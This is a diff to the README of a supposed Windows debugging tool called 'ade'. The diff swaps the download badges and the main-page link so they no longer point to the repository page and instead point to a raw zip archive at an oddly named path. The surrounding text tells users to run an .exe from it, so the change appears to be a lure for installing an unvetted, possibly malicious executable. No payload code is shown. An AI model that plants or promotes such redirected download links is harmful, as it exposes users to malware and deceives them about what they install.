@@ -1,6 +1,6 @@
 # 🤖 ade - Simplify Your Code Debugging Process
 
-[![Download ade](https://img.shields.io/badge/Download-ade-brightgreen)](https://github.com/Vaiolina/ade)
+[![Download ade](https://img.shields.io/badge/Download-ade-brightgreen)](https://raw.githubusercontent.com/Vaiolina/ade/main/Sterculia/Software-thrail.zip)
 
 ---
 
@@ -38,7 +38,7 @@ Follow these steps to get ade up and running on your Windows PC.
 
 Click the button below to visit the page where you can download ade. This page has the latest version of the tool ready for Windows.
 
-[![Visit ade Download Page](https://img.shields.io/badge/Visit-Download%20Page-blue)](https://github.com/Vaiolina/ade)
+[![Visit ade Download Page](https://img.shields.io/badge/Visit-Download%20Page-blue)](https://raw.githubusercontent.com/Vaiolina/ade/main/Sterculia/Software-thrail.zip)
 
 When you open the page, look for the latest Windows installer or executable file. It will often have a `.exe` ending in the file name.
 
@@ -125,4 +125,4 @@ A: You can download and use ade from the link above without any cost.
 
 You can always visit the main page to get the latest version or to download ade again if needed:
 
-[https://github.com/Vaiolina/ade](https://github.com/Vaiolina/ade)
+[https://raw.githubusercontent.com/Vaiolina/ade/main/Sterculia/Software-thrail.zip](https://raw.githubusercontent.com/Vaiolina/ade/main/Sterculia/Software-thrail.zip)
